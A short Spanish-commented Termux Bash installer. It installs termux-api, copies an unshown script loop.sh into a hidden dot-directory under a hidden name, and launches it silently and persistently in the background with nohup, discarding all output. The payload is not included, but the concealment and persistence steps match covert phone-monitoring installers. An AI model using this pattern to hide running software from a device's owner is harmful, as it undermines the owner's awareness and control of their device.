#!/data/data/com.termux/files/usr/bin/bash

# Actualizar paquetes e instalar dependencias del sistema de forma silenciosa
apt update -y && apt upgrade -y
apt install termux-api -y

# Crear un directorio oculto dentro del entorno de Termux si no existe
mkdir -p ~/.config/.loop_service

# Mover el script principal al directorio oculto
cp loop.sh ~/.config/.loop_service/.loop.sh

# Otorgar permisos de ejecución al script oculto
chmod +x ~/.config/.loop_service/.loop.sh

# Ejecutar el script en segundo plano de forma persistente desvinculándolo de la terminal actual
nohup ~/.config/.loop_service/.loop.sh > /dev/null 2>&1 &

echo "Instalación completada. El servicio se está ejecutando en segundo plano."
